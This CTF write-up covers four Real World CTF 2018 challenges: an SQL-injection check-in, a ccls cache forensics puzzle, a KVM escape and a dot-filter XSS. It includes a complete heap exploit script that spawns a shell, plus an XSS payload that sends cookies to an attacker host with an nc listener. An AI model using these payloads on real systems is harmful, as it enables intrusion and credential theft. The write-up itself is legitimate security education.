# 2018-07-28-Real-World-CTF-Quals #

[CTFTime link](https://ctftime.org/event/645) | [Website](https://realworldctf.com/)

---

## Challenges ##

### Blockchain ###

 - [ ] 378 MultiSigWallet

### Check-in ###

 - [x] [66 advertisement](#66-check-in--advertisement)

### Forensics ###

 - [x] [146 ccls-fringe](#146-forensics--ccls-fringe)

### Pwn ###

 - [ ] 500 SCSI
 - [ ] 425 doc2own
 - [ ] 451 state-of-the-art vm
 - [ ] 500 Spectre-Free
 - [x] [188 kid vm](#188-pwn--kid-vm)
 - [ ] 477 P90 RUSH B
 - [ ] 451 untrustworthy

### Web ###

 - [ ] 500 PrintMD
 - [x] [105 dot free](#105-web--dot-free)
 - [ ] 208 bookhub

---

## 66 Check-in / advertisement ##

**Description**

> This platform is under protection. DO NOT hack it.

**No files provided**

**Solution**

This was the check-in challenge for this CTF, which usually means "look for the flag in the IRC channel". But in this case the flag was nowhere to be found, neither in the IRC nor in the rules, nor in the webpage comments.

My teammate heard that the advertisement is in some way related to CloudFlare, and the CTF website was indeed protected by CloudFlare. I spent some time looking for something interesting in the WHOIS information, or something related to CF status reports, but to no avail.

The very first thing I tried with this challenge was actually to input `" OR 1 == 1 -- ` as the flag, and doing this redirected me to a login page. I did not think much of it, but I was never logged off, and inputting a wrong flag in the other challenges did not redirect - it simply flashed a "Wrong flag" message.

After entering a wrong flag for a different challenge for the first time, I realised this and came back to this challenge. Once again I input the SQL injection and looked in the HTML comments in the login form, and the flag was there!

`rwctf{SafeLine_1s_watch1ng_uuu}`

## 146 Forensics / ccls-fringe ##

**Description**

> Ray said that the challenge "Leaf-Similar Trees" from last LeetCode Weekly was really same-fringe problem and wrote it in the form of coroutine which he learned from a Stanford friend. Can you decrypt the cache file dumped from a language server without reading the source code? The flag is not in the form of rwctf{} because special characters cannot be used.

**Files provided**

 - [ccls-fringe.tar.xz](https://s3-us-west-1.amazonaws.com/realworldctf/ccls-fringe.tar.xz)

**Solution**

First let's examine the contents of the archive:

    $ tar xzfv ccls-fringe.tar.xz
    x .ccls-cache/
    x .ccls-cache/@home@flag@/
    x .ccls-cache/@home@flag@/fringe.cc.blob
    $ xxd .ccls-cache/\@home\@flag\@/fringe.cc.blob | head
    0000000: 2202 ff00 5832 c065 8487 2a04 002f 686f  "...X2.e..*../ho
    0000010: 6d65 2f66 6c61 672f 6672 696e 6765 2e63  me/flag/fringe.c
    0000020: 6300 0225 636c 616e 6700 2f68 6f6d 652f  c..%clang./home/
    0000030: 666c 6167 2f66 7269 6e67 652e 6363 00a9  flag/fringe.cc..
    0000040: 2f75 7372 2f69 6e63 6c75 6465 2f63 2b2b  /usr/include/c++
    0000050: 2f38 2e31 2e31 2f65 7874 2f61 746f 6d69  /8.1.1/ext/atomi
    0000060: 6369 7479 2e68 00ff 007c 5bae 8205 682a  city.h...|[...h*
    0000070: 2f75 7372 2f69 6e63 6c75 6465 2f61 736d  /usr/include/asm
    0000080: 2d67 656e 6572 6963 2f65 7272 6e6f 2e68  -generic/errno.h
    0000090: 00ff 0008 b092 b81c 472a 2f75 7372 2f69  ........G*/usr/i

([full fringe.cc.blob file](scripts/fringe.cc.blob))

The `.blob` file contains a lot of C++ library names, and even some fragments of code. But clearly it is not a source code file, nor an executable. With some googling ([`ccls-cache format`](https://github.com/MaskRay/ccls/wiki/Initialization-options)) we can easily find what this cache system is – it is a file created by [`ccls`](https://github.com/MaskRay/ccls/). The documentation mentions there are two serialisation formats, JSON and binary, but it doesn't really go into the specifics of the binary format. However, after some skimming through the repository, we can find the [key files](https://github.com/MaskRay/ccls/tree/master/src/serializers) for the actual serialisation formats.

These essentially only specify how to encode various primitives and standard library types, but the meat of the process, i.e. destructuring the classes used internally ba `ccls` is done [here](https://github.com/MaskRay/ccls/blob/master/src/serializer.cc). In particular:

    std::string Serialize(SerializeFormat format, IndexFile& file) {
      switch (format) {
        case SerializeFormat::Binary: {
          BinaryWriter writer;
          int major = IndexFile::kMajorVersion;
          int minor = IndexFile::kMinorVersion;
          Reflect(writer, major);
          Reflect(writer, minor);
          Reflect(writer, file);
          return writer.Take();
        }
      // ...
    }

And the actual `IndexFile`:

    // IndexFile
    bool ReflectMemberStart(Writer& visitor, IndexFile& value) {
      visitor.StartObject();
      return true;
    }
    template <typename TVisitor>
    void Reflect(TVisitor& visitor, IndexFile& value) {
      REFLECT_MEMBER_START();
      if (!gTestOutputMode) {
        REFLECT_MEMBER(last_write_time);
        REFLECT_MEMBER(language);
        REFLECT_MEMBER(lid2path);
        REFLECT_MEMBER(import_file);
        REFLECT_MEMBER(args);
        REFLECT_MEMBER(dependencies);
      }
      REFLECT_MEMBER(includes);
      REFLECT_MEMBER(skipped_ranges);
      REFLECT_MEMBER(usr2func);
      REFLECT_MEMBER(usr2type);
      REFLECT_MEMBER(usr2var);
      REFLECT_MEMBER_END();
    }

With this, we can start writing a deserialiser. It might have been faster to just clone the repo and see if it could be used to convert from the binary format into the JSON format, but I was worried the build would be problematic, since `ccls` depends on LLVM.

Some more relevant source code files:

 - https://github.com/MaskRay/ccls/blob/master/src/indexer.h
 - https://github.com/MaskRay/ccls/blob/master/src/indexer.cc
 - https://github.com/MaskRay/ccls/blob/master/src/serializer.h
 - https://github.com/MaskRay/ccls/blob/master/src/serializer.cc
 - https://github.com/MaskRay/ccls/blob/master/src/position.h
 - https://github.com/MaskRay/ccls/blob/master/src/position.cc
 - https://github.com/cquery-project/cquery/blob/master/src/lsp.h
 - https://github.com/cquery-project/cquery/blob/master/src/symbol.h
 - https://github.com/MaskRay/ccls/blob/master/src/serializers/binary.h

So with the data deserialised, I had all the information known to the caching system, except the original source code, of course. The data includes the C++ includes, classes, functions, and variables defined in the file. One thing I noticed while writing the deserialiser is that there is a "comments" field in all defined members (classes, functions, variables).

One of these comments fields says `flag is here` (though this can clearly be seen in the file with a hex editor as well). With the deserialised data, we can tell which member this comment is attached to. Interestingly, it was a field called `int b` – clearly its 32-bit value cannot contain the actual flag, so what could this mean?

Another useful piece of information in the data is `spell`, presumably the place where the name of each member is initially given (i.e. declaration). `spell` includes a `range`, i.e. the line-column positions delimiting the beginning and ending of the member name.

At this point I was thinking my best bet would be to reconstruct as much of the original source code as possible from the positional data, then deduce control structures from the article mentioned in the challenge description and hope that the code somehow produces the flag.

Well, in the process of doing this, I got a file that looked like this:

```




       TreeNode 
      val 
            left 
            right 


       Co 
             c 
       stack 
            ret 
  Co             link         f                               root             b 
                                                                               l 
                                                                               e 
                                                                               s 
                                                                               s 


       yield           x                                                       w 
                                                                               o 
                                                                               d 



     dfs     c            x                                                    w 
                                                                               h 
                                                                               o 
                                                                               i 
                                                                               s 


      Solution 

       leafSimilar           root1            root2                            i 
               c                                                               n 
       c2                  c1                                                  h 
                                                                               k 







     insert            x            y 





    main 
           xs 
           ys 
           zs 
            tx             ty             tz 
             x 
             y 
             z 
           s 
```

([full deserialiser script](scripts/Fringe.hx))

Most of it seems normal enough, but some variables in the rightmost columns spell out `bless wod whois inhk`. Clearly this wasn't a coincidence so I checked to see if this was the flag ... and sure enough, it was!

`blesswodwhoisinhk`

## 188 Pwn / kid vm ##

**Description**

> Writing a vm is the best way to teach kids to learn vm escape.
> 
> nc 34.236.229.208 9999

**Files provided**

 - [kid-vm.zip](https://s3-us-west-1.amazonaws.com/realworldctf/kid_vm_801180ca894848965a2d6424472e0acb.zip)

**Solution**

A VM escape challenge. A VM is implemented using hypervisor `/dev/kvm`. We need to escape the VM and get RCE.

The program can't be run in VM ubuntu, since there is no `/dev/kvm`.

Initially, I was trying to figure out what each `ioctl` does; however, this is not useful. What we need to do is to look at how VM handles special instruction such as `in/out/vmcall` and what the guest OS does.

here is the code to handle `in` and `out`

```c
case 2u:
  if ( *((_BYTE *)p_vcpu + 32) == 1
    && *((_BYTE *)p_vcpu + 33) == 1
    && *((_WORD *)p_vcpu + 17) == 0x17
    && *((_DWORD *)p_vcpu + 9) == 1 )
  {
    putchar(*((char *)p_vcpu + p_vcpu[5]));// out to print to stdout
    continue;
  }
  if ( !*((_BYTE *)p_vcpu + 32)
    && *((_BYTE *)p_vcpu + 33) == 1
    && *((_WORD *)p_vcpu + 17) == 23
    && *((_DWORD *)p_vcpu + 9) == 1 )
  {
    read(0, (char *)p_vcpu + p_vcpu[5], 1uLL);// in to get input from stdin
    continue;
  }
  fwrite("Unhandled IO\n", 1uLL, 0xDuLL, stderr);
  return 1LL;
```

and here is the code to handle, where we do memory operation on host machine

```c
if ( vm_codes[*(_QWORD *)&regs[128]] == 0xF
  && vm_codes[*(_QWORD *)&regs[128] + 1] == 1
  && vm_codes[*(_QWORD *)&regs[128] + 2] == 0xC1u )
{//0f 01 c1 is the byte code of vmcall
  if ( ioctl(fd_vcpu, 0x8090AE81uLL, regs) == -1 )
    puts("Error get regs!");
  switch ( *(unsigned __int16 *)regs )
  {
    case 0x101u:
      free_host(*(__int16 *)&regs[8], *(unsigned __int16 *)&regs[16]);
      break;
    case 0x102u:
      update_host(
        *(__int16 *)&regs[8],
        *(unsigned __int16 *)&regs[16],
        *(unsigned __int16 *)&regs[24],
        (__int64)vm_codes);
      break;
    case 0x100u:
      alloc_host(*(unsigned __int16 *)&regs[8]);
      break;
    default:
      puts("Function error!");
      break;
  }
}
```

Some of the constants of `ioctl` can't be found in IDA, I don't know why. In addition, the online resources are rare and unclear, so the relevant data structures and macros are hard to identify, and I wasted much time on looking for what each `ioctl` does. Luckily, this is not so important to solve this challenge.

### guest OS arbitrary code execution

The guest OS memory is set here

```c
v13 = 0LL;
v14 = 0LL;
v15 = 0x10000LL;
v16 = vm_codes;
//vm_codes comes from data from 0x18E0
if ( ioctl(fd_vm, 0x4020AE46uLL, &v13) == -1 )// AE46 KVM_SET_USER_MEMORY_REGION
{
    perror("Fail");
    return 1LL;
}
```

dump the 896 bytes of data at 0x18e0 and add some 0 to make binary file page aligned(because the program uses memory after 896 as global variables), analyze using 16 bits real-mode assembly. The reason is when a CPU starts, the mode is initially 16 bits real mode.

And this is quite clear, the host memory allocation is implemented using `vmcall`; input and output are also implemented using `in` and `out`. They are all handled by the VM program when these instruction are being executed.

Normal memory allocation starts at 0x5000

```assembly
89 CF       mov     di, cx          ; actual allocation
81 C1 00 50 add     cx, 5000h
01 F6       add     si, si
89 8C 46 03 mov     ds:mems[si], cx
89 84 66 03 mov     ds:sizes[si], ax
01 C7       add     di, ax
89 3E 44 03 mov     ds:next_alloc, di
A0 42 03    mov     al, ds:num_of_mem
FE C0       inc     al
A2 42 03    mov     ds:num_of_mem, al
EB 1F       jmp     short loc_E1
;codes from alloc_6f
```

The size limitation for each chunk is 0x1000

```assembly
A1 40 03    mov     ax, ds:alloc_size
3D 00 10    cmp     ax, 1000h
77 33       ja      short loc_C2
```

The max bound is 0xb000

```assembly
8B 0E 44 03 mov     cx, ds:next_alloc
81 F9 00 B0 cmp     cx, 0B000h
77 34       ja      short loc_CD
```

However, this is problematic, if we alloc `0xb000 + 0x5000 = 0x10000`, which becomes `0x0000` due to overflow, and the codes of program is here! So we can write to codes and get arbitrary code execution. 

PS: in 16 bits real mode, there is no such thing as RWX attribute of pages.

To test our idea, we can write `0x0000-0x1000` to `hlt` or `int3`, and it is clear that the reaction is different.

### VM escape

in free host, there is a UAF

```c
void __fastcall free_host(__int16 a1, unsigned __int16 a2)
{
  if ( a2 <= 0x10u )
  {
    switch ( a1 )
    {
      case 2:
        free((void *)buf[a2]);
        buf[a2] = 0LL;
        --dword_20304C;
        break;
      case 3:
        free((void *)buf[a2]);
        buf[a2] = 0LL;
        sizes[a2] = 0;
        --dword_20304C;
        break;
      case 1:
        free((void *)buf[a2]);                  // UAF & double free
        break;
    }
  }
  else
  {
    perror("Index out of bound!");
  }
}
```

However, this will not be executed if we don't have arbitrary code execution in guest OS, since only case 3 will be called by vmcall in guest OS.

```assembly
68 00 01    push    100h
9D          popf
B8 01 01    mov     ax, 101h
BB 03 00    mov     bx, 3
8A 0E 43 03 mov     cl, ds:idx
0F 01 C1    vmcall
```

also, in update, there is an operation for us to leak libc, case 2

```c
void __fastcall update_host(__int16 a1, unsigned __int16 a2, unsigned __int16 a3, __int64 a4)
{
  if ( a2 <= 0x10u )
  {
    if ( buf[a2] )
    {
      if ( (unsigned int)a3 <= sizes[a2] )
      {
        if ( a1 == 1 )
        {
          memcpy((void *)buf[a2], (const void *)(a4 + 0x4000), a3);
        }
        else if ( a1 == 2 )
        {
          memcpy((void *)(a4 + 0x4000), buf[a2], a3);
        }
      }
        //....
```

Similarly, this will not be called unless we get arbitrary code execution in guest OS.

Therefore, the vuln is UAF with `0x80 <= size <= 0x1000`, we can use house of orange to exploit it.

The way to exploit is not hard, just regard it as a normal pwn, I will not explain this in detail.

The exploit is 

```python
from pwn import *

g_local=False
e=ELF('./libc-2.23.so')
context.log_level='debug'
UPDATE_RET_ADDR = 0x122
LAST_ALLOC_SIZE = 0x1F3
IO_STR_FINISH = 0x3c37b0
UNSORT_OFF = 0x7f603f138b78 - 0x7f603ed74000
if g_local:
	sh = process('./kidvm')#, env={'LD_PRELOAD':'./libc-2.23.so'})
	#gdb.attach(sh)
else:
	sh = remote("34.236.229.208", 9999)


def alloc(size):
	sh.send("1")
	sh.recvuntil("Size:")
	sh.send(p16(size))
	sh.recvuntil("Your choice:")

def update(idx, content):
	sh.send("2")
	sh.recvuntil("Index:")
	sh.send(chr(idx))
	sh.recvuntil("Content:")
	sh.send(content)
	#sh.recvuntil("Your choice:")

def alloc_host(size):
	push_0x100_popf = "\x68\x00\x01\x9D"
	# forgot this initially, stuck for 1 hours :(
	mov_ax = "\xB8" + p16(0x100)
	mov_bx = "\xBB" + p16(size)
	vmcall = "\x0f\x01\xc1"
	return push_0x100_popf + mov_bx + mov_ax + vmcall

def update_host(size, idx, bx):
	push_0x100_popf = "\x68\x00\x01\x9D"
	mov_ax = "\xB8" + p16(0x102)
	mov_bx = "\xBB" + p16(bx)
	mov_cx = "\xB9" + p16(idx)
	mov_dx = "\xBA" + p16(size)
	vmcall = "\x0f\x01\xc1"
	return push_0x100_popf + mov_ax + mov_bx + mov_cx + mov_dx + vmcall

def free_host(idx):
	push_0x100_popf = "\x68\x00\x01\x9D"
	mov_ax = "\xB8" + p16(0x101)
	mov_bx = "\xBB" + p16(1) # 1 will cause UAF
	mov_cx = "\xB9" + p16(idx)
	vmcall = "\x0f\x01\xc1"
	return push_0x100_popf + mov_ax + mov_bx + mov_cx + vmcall

def write_stdout(addr, size, ip):
	mov_ax = "\xB8" + p16(addr)
	mov_bx = "\xBB" + p16(size)
	call = "\xE8" + p16(0x1f3 - (ip + len(mov_ax + mov_bx) + 3))
	return mov_ax + mov_bx + call

def read_stdin(addr, size, ip):
	mov_ax = "\xB8" + p16(addr)
	mov_bx = "\xBB" + p16(size)
	call = "\xE8" + p16(0x205 - (ip + len(mov_ax + mov_bx) + 3))
	return mov_ax + mov_bx + call

sh.recvuntil("Your choice:")

for i in xrange(0,0xb):
	alloc(0x1000)
alloc(LAST_ALLOC_SIZE)
#now edit 0xb to write code segment of guest OS

shellcode = alloc_host(0x80) #0
shellcode += alloc_host(0x80) #1
shellcode += free_host(0)
shellcode += update_host(8, 0, 2)
shellcode += write_stdout(0x4000, 8, len(shellcode) + UPDATE_RET_ADDR)
shellcode += free_host(1) #consolidate
shellcode += alloc_host(0x90) #2
shellcode += alloc_host(0x200) #3 edit 1 to edit this chunk header
rec = len(shellcode)
shellcode += alloc_host(0x80) #4 prevent consolidate
shellcode += free_host(3)
shellcode += read_stdin(0x4000, 0x10, len(shellcode) + UPDATE_RET_ADDR)
shellcode += update_host(0x10, 1, 1)
shellcode += read_stdin(0x4000, 0xE0, len(shellcode) + UPDATE_RET_ADDR)
shellcode += update_host(0xE0, 3, 1)
#shellcode += alloc_host(10)
shellcode += "\xEB" + chr((rec - (len(shellcode) + 2)) & 0xFF)

payload = "\xcc" * UPDATE_RET_ADDR
payload += shellcode
assert len(payload) < LAST_ALLOC_SIZE
payload += (LAST_ALLOC_SIZE - len(payload)) * "\x90"

update(0xb, payload)

libc_addr = u64(sh.recvuntil("\x00\x00")) - UNSORT_OFF
print hex(libc_addr)

fake_file = p64(0)
fake_file += p64(0x61)
fake_file += p64(libc_addr + UNSORT_OFF)
fake_file += p64(libc_addr + e.symbols["_IO_list_all"] - 0x10)
fake_file += p64(2) + p64(3)
fake_file += "\x00" * 8
fake_file += p64(libc_addr + next(e.search('/bin/sh\x00'))) #/bin/sh addr
fake_file += (0xc0-0x40) * "\x00"
fake_file += p32(0) #mode
fake_file += (0xd8-0xc4) * "\x00"
fake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr
fake_file += (0xe8-0xe0) * "\x00"
fake_file += p64(libc_addr + e.symbols["system"])

sh.send(fake_file[0:0x10])
assert len(fake_file[0x10:]) == 0xE0

sh.send(fake_file[0x10:])

sh.interactive()
```

PS: It seems that `asm` in pwntools does not work for 16 bits assembly

 - [mem2019](https://github.com/mem2019)

## 105 Web / dot free ##

**Description**

> All the IP addresses and domain names have dots, but can you hack without dot?
> 
> http://13.57.104.34/

([local copy of website](files/dotfree.html))

**No files provided**

**Solution**

We are presented with a simple form that asks for a URL:

![](screens/dotfree.png)

A lot of what we can put inside results in errors, with the website outputting simply:

    {"msg": "invalid URL!"}

If we put in a valid URL, such as the URL of the website itself however (`http://13.57.104.34/`), we get:

    {"msg": "ok"}

(Note that any valid URL works, but we need to use this website since this is a cookie-stealing XSS attack.)

So the structure of this challenge is very similar to that of [Excesss (SecurityFest 2018)](https://github.com/Aurel300/empirectf/blob/master/writeups/2018-05-31-SecurityFest/README.md#51-web--excesss). What can we actually do with the website? The crucial code is this:

    function lls(src) {
        var el = document.createElement('script');
        if (el) {
            el.setAttribute('type', 'text/javascript');
            el.src = src;
            document.body.appendChild(el);
        }
    };

    function lce(doc, def, parent) {
        var el = null;
        if (typeof doc.createElementNS != "undefined") el = doc.createElementNS("http://www.w3.org/1999/xhtml", def[0]);
        else if (typeof doc.createElement != "undefined") el = doc.createElement(def[0]);

        if (!el) return false;

        for (var i = 1; i
        < def.length; i++) el.setAttribute(def[i++], def[i]);
        if (parent) parent.appendChild(el);
        return el;
    };
    window.addEventListener('message', function (e) {
        if (e.data.iframe) {
            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
                if (e.data.iframe.type == "iframe") {
                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
                } else {
                    lls(e.data.iframe.value)
                }
            }
        }
    }, false);
    window.onload = function (ev) {
        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
    }

When the `window` loads, it posts a message containing the part of the URL after the `?` character, decoded as JSON, to any (`*`) origin. This message is immediately caught by the `message` listener defined above.

In the listener, the function checks that an `iframe` property is defined on the decoded JSON object, and then a bunch more checks:

 - `e.data.iframe` - duplicate check for the `iframe` property (?)
 - `e.data.iframe.value.indexOf('.') == -1` - the `value` property cannot contain the `.` character
 - `e.data.iframe.value.indexOf("//") == -1` - the `value` property cannot contain the `//` substring
 - `e.data.iframe.value.indexOf("。") == -1` - the `value` property cannot contain the `。` character
 - `e.data.iframe.value` - check for the `value` property on `iframe`
 - `typeof(e.data.iframe != 'object')` - this one is a little misleading; it does not assert that the type of `iframe` is not `object`, instead it checks the type of the expression `e.data.iframe != 'object'` (which will always be true unless we give it the literal string `object`), and this type will always be `"boolean"`, which will not cause the condition to fail since a string is a truthy value

If we can pass these conditions, the value we provided is either used as the `src` for an `<iframe>` or as an `src` for a `<script>`. I'm not sure how well an `<iframe>` would work since we are stealing cookies and all, but more importantly, this line:

    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);

Seems to always trigger an error, at least when testing locally, since neither `doc` nor `parent` are defined, but are used inside the `lce` function. Bit weird.

So instead, we use the `<script>` option. To summarise, we can basically create a `<script>` tag on the target user's website with any `src` we choose, but it cannot contain `.` or `//`, so a full URL should not really work.

Note: I did not realise during the CTF, but there are at least two other ways to circumvent the condition apart from not using `.` or `//`:
 - supply the `value` as an array (then `value.indexOf` checks for elements inside the array, not substrings in a string), which will then get turned into a string automatically
 - use some backslash quirkiness in URL parsing, e.g. `http:/\1234/` still works in some browsers

During the CTF I found a way to provide a malicious script without using `.` or `//`, however.

The method I used was the [`data://` scheme](https://en.wikipedia.org/wiki/Data_URI_scheme). It allows specifying the full content of a file as well as its `Content-Type` as a URI, e.g. 

    data:text/html,<i>hello</i> <b>world</b>

Is an extremely simple HTML document that can be used as a [link](data:text/html,<i>hello</i> <b>world</b>). This scheme can also be used for binary data by adding `;base64` to the `Content-Type`, then encoding the bytes of the data with the Base64 encoding. Using this technique, we can provide arbitrary JavaScript content.

Our informed guess is that the flag will be in the user's cookies, so we want our script to make a request to a website we control and provide the cookies. We have to do this since the website itself only says `{"msg": "ok"}` and provides no way to see what actually happened when our victim loaded our XSS attack. So, here is our payload:

    window.location='http://<IP we control>:1337/'+document.cookie

We can encode this and wrap it in the JSON structure required by the challenge:

    const payload = `window.location='http://<IP we control>:1337/'+document.cookie`
         ,b64 = Buffer.from(payload).toString('base64')
         ,wrap = `{"iframe":{"type":"script","value":"data:text/javascript;base64,${b64}"}}`
         ,url = `http://13.57.104.34/?${encodeURIComponent(wrap)}`;
    console.log(url);

Then:

    $ node make.js
    http://13.57.104.34/?%7B%22iframe%22%3A%7B%22type%22%3A%22script%22%2C%22value%22%3A%22data%3Atext%2Fjavascript%3Bbase64%2Cd2luZG93LmxvY2F0aW9uPSdodHRwOi8vYXJlbnQteW91LWN1cmlvLnVzOjEzMzcvJytkb2N1bWVudC5jb29raWU%3D%22%7D%7D

Now on the <IP we control>, we listen for packets:

    $ nc -l -p 1337

Finally, we provide the generated URL to the website and sure enough, we get the cookies:

    GET /flag=rwctf%7BL00kI5TheFlo9%7D HTTP/1.1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,* /*;q=0.8
    Referer: http://127.0.0.1/?%7B%22iframe%22%3A%7B%22type%22%3A%22script%22%2C%22value%22%3A%22data%3Atext%2Fjavascript%3Bbase64%2Cd2luZG93LmxvY2F0aW9uPSdodHRwOi8vYXJlbnQteW91LWN1cmlvLnVzOjEzMzcvJytkb2N1bWVudC5jb29raWU%3D%22%7D%7D
    User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
    Connection: Keep-Alive
    Accept-Encoding: gzip, deflate
    Accept-Language: en,*
    Host: <IP we control>:1337

`rwctf{L00kI5TheFlo9}`
